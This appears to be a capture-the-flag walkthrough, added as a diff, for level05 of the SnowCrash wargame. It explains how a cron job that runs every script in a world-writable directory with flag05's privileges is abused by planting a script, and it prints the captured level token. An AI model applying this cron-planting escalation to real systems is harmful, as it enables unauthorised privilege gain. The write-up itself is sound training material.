@@ -1,0 +1,35 @@
+# after we ssh to level05 we receive a message about receiving a mail
+# let's open local mail inbox:
+level05@SnowCrash:~$ cat /var/mail/level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05level05@SnowCrash:~$ cat /var/mail/level05 
+
+# it seems there's a cronjob running every two minutes with 'flag05' user's privileges
+# let's investigate the script (running every two minutes)
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver 
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+
+# the script is iterating through all scripts in /opt/openarenaserver/ and running each of them every two minutes with 'flag05' privileges
+# checking my permissions in this directory I found out that I can create any script
+# let's create a script that runs /bin/getflag and stores it in a file in /tmp
+
+level05@SnowCrash:~$ echo "/bin/getflag > /tmp/my_flag" > /opt/openarenaserver/my_flag
+level05@SnowCrash:~$ ls /opt/openarenaserver/
+my_flag
+
+# let's wait that the cronjob executes
+
+level05@SnowCrash:~$ cat /tmp/my_flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+level05@SnowCrash:~$ su level06
+Password: 
+level06@SnowCrash:~$ 
+
+# level06 unlocked
